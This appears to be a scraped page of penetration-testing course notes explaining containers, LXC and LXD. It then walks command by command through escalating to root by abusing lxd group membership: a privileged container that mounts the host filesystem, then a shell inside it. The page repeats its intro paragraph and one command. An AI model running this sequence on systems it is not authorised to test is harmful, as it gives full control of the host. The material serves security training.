Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible

---

## Linux Containers

####   
Linux Privilege Escalation   

1. Page 14
2. LXD

# Containers

---

Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. For example, they facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. Another example would be the isolation of processes that usually require root privileges. Such an application could be a web application or API that must be isolated from the host system to prevent escalation to databases.

---

## Linux Containers

Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

By default, `LXC` consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously. A platform with `LXC` can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer's system will work on any other system. In addition, large applications can be started, stopped, or their environment variables changed via the Linux container interface.

#### Linux Daemon

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

```shell
$ id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

```shell
cd ContainerImages
ubuntu-template.tar.xz
```

```shell
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

```shell
lxc image list
```

```shell
lxc init ubuntutemp privesc -c security.privileged=true
```

```shell
lxc init ubuntutemp privesc -c security.privileged=true
```

```shell
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```shell
lxc start privesc
```

```shell
lxc exec privesc /bin/bash
ls -l /mnt/root
```



